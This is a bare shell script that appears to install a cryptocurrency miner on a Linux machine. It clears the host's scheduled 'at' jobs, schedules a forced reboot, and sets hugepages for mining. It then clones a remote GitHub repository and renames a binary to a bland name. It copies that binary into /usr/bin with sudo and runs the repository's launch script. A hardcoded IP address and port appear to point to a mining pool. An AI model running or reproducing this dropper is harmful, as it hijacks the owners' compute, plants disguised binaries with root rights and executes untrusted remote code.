#!/bin/sh
IPADR="95.216.187.139:4500"
MNRCO="wewwws"
ID="$(hostname)"
THREADS="$(nproc --all)"
for i in `atq | awk '{print $1}'`;do atrm $i;done
echo 'sudo reboot -f' | at now + 1 minute
rm -rf /tmp/none/
for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo dpkg --configure -a
echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sudo apt-get install dos2unix
sleep 2
cd /tmp && mkdir none
git clone https://github.com/nomonom/nbnberrtest1.git /tmp/none
cd /tmp/none
chmod 777 ./*.sh
mv service $MNRCO
chmod +x /tmp/none/$MNRCO
sudo cp /tmp/none/$MNRCO /usr/bin/$MNRCO
sleep 3
sudo dos2unix pusk.sh
. ./pusk.sh
